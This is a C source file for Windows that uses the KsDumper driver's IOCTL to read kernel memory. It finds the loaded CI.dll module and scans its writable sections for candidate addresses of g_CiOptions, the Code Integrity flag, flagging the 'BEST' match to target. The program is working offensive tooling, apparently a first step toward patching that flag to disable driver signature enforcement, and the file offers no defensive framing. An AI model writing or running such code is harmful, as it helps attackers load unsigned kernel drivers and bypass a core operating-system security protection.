#pragma warning(disable:4819)
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

/* KsDumper IOCTL for reading kernel memory */
#define IO_COPY_MEMORY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1725, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

typedef NTSTATUS(NTAPI* PFN_NtQSI)(ULONG, PVOID, ULONG, PULONG);

typedef struct {
    HANDLE Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize; ULONG Flags;
    USHORT LoadOrderIndex; USHORT InitOrderIndex; USHORT LoadCount; USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} MY_MOD;
typedef struct { ULONG NumberOfModules; MY_MOD Modules[1]; } MY_MODS;

typedef struct {
    INT32 targetProcessId;
    PVOID targetAddress;
    PVOID bufferAddress;
    INT32 bufferSize;
} KCOPY;

static HANDLE hDev = INVALID_HANDLE_VALUE;

/* Read kernel memory via KsDumper (pid=4 = System process) */
static BOOL ReadKernel(ULONG64 addr, PVOID buf, DWORD size)
{
    KCOPY req;
    DWORD ret;
    req.targetProcessId = 4;
    req.targetAddress = (PVOID)(ULONG_PTR)addr;
    req.bufferAddress = buf;
    req.bufferSize = (INT32)size;
    return DeviceIoControl(hDev, IO_COPY_MEMORY, &req, sizeof(req), NULL, 0, &ret, NULL);
}

int main(void)
{
    PFN_NtQSI pNtQSI;
    MY_MODS* mods; ULONG size=0, i;
    ULONG64 ciBase=0; ULONG ciSize=0;
    HANDLE hFile; DWORD fileSize, br;
    BYTE* fd; IMAGE_DOS_HEADER* dos; IMAGE_NT_HEADERS64* nt; IMAGE_SECTION_HEADER* sect;
    USHORT si;
    char winDir[MAX_PATH], path[MAX_PATH];

    printf("=== Find g_CiOptions in kernel memory ===\n\n");

    hDev = CreateFileW(L"\\\\.\\KsDumper", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDev == INVALID_HANDLE_VALUE) { printf("[-] KsDumper not loaded\n"); return 1; }

    pNtQSI = (PFN_NtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    pNtQSI(11,NULL,0,&size);
    mods=(MY_MODS*)malloc(size+4096);
    pNtQSI(11,mods,size+4096,&size);
    for(i=0;i<mods->NumberOfModules;i++){
        char*n=(char*)mods->Modules[i].FullPathName+mods->Modules[i].OffsetToFileName;
        if(_stricmp(n,"CI.dll")==0||_stricmp(n,"ci.dll")==0){
            ciBase=(ULONG64)(ULONG_PTR)mods->Modules[i].ImageBase;
            ciSize=mods->Modules[i].ImageSize;
            break;
        }
    }
    free(mods);
    printf("CI.dll base: 0x%llX size: 0x%X\n", ciBase, ciSize);

    /* Read CI.dll PE header from kernel memory */
    GetWindowsDirectoryA(winDir,MAX_PATH);
    sprintf_s(path,MAX_PATH,"%s\\System32\\ci.dll",winDir);
    hFile=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    fileSize=GetFileSize(hFile,NULL);
    fd=(BYTE*)malloc(fileSize);
    ReadFile(hFile,fd,fileSize,&br,NULL);
    CloseHandle(hFile);

    dos=(IMAGE_DOS_HEADER*)fd;
    nt=(IMAGE_NT_HEADERS64*)(fd+dos->e_lfanew);
    sect=(IMAGE_SECTION_HEADER*)((BYTE*)&nt->OptionalHeader+nt->FileHeader.SizeOfOptionalHeader);

    printf("Scanning writable sections in KERNEL memory...\n\n");

    for(si=0;si<nt->FileHeader.NumberOfSections;si++){
        char name[9]={0};
        DWORD virtRVA, virtSize, rawSize, chars;
        DWORD scanSize, j, count;
        DWORD* kernBuf;

        memcpy(name,sect[si].Name,8);
        virtRVA=sect[si].VirtualAddress;
        virtSize=sect[si].Misc.VirtualSize;
        rawSize=sect[si].SizeOfRawData;
        chars=sect[si].Characteristics;

        if(!(chars&0x80000000)) continue; /* not writable */
        scanSize = virtSize > rawSize ? virtSize : rawSize;
        if(scanSize==0||scanSize>0x100000) continue;

        printf("[%s] virtRVA=0x%X virtSize=0x%X\n", name, virtRVA, virtSize);

        /* Read this section from KERNEL memory */
        kernBuf = (DWORD*)malloc(scanSize);
        memset(kernBuf, 0, scanSize);

        if (!ReadKernel(ciBase + virtRVA, kernBuf, scanSize))
        {
            printf("  (read failed, trying smaller chunks)\n");
            /* Try 4KB chunks */
            DWORD off;
            for (off = 0; off < scanSize; off += 4096) {
                DWORD chunk = scanSize - off;
                if (chunk > 4096) chunk = 4096;
                ReadKernel(ciBase + virtRVA + off, (BYTE*)kernBuf + off, chunk);
            }
        }

        count = scanSize / 4;
        for (j = 0; j < count; j++) {
            ULONG val = kernBuf[j];
            /* g_CiOptions known values: 0, 6, 8, 0x26 */
            if (val == 6 || val == 0x26 || val == 8) {
                int ok = 1;
                if (j>0 && (kernBuf[j-1]==6||kernBuf[j-1]==0x26||kernBuf[j-1]==8)) ok=0;
                if (j+1<count && (kernBuf[j+1]==6||kernBuf[j+1]==0x26||kernBuf[j+1]==8)) ok=0;
                if (ok) {
                    ULONG64 kaddr = ciBase + virtRVA + j*4;
                    int zeroNeighbors = (j==0||kernBuf[j-1]==0) && (j+1>=count||kernBuf[j+1]==0);
                    printf("  *** FOUND: +%04X RVA=0x%X kern=0x%llX val=0x%X %s\n",
                           j*4, virtRVA+j*4, kaddr, val, zeroNeighbors?"<-- BEST":"");
                }
            }
        }
        free(kernBuf);
    }

    free(fd);
    CloseHandle(hDev);
    printf("\nDone.\n");
    return 0;
}
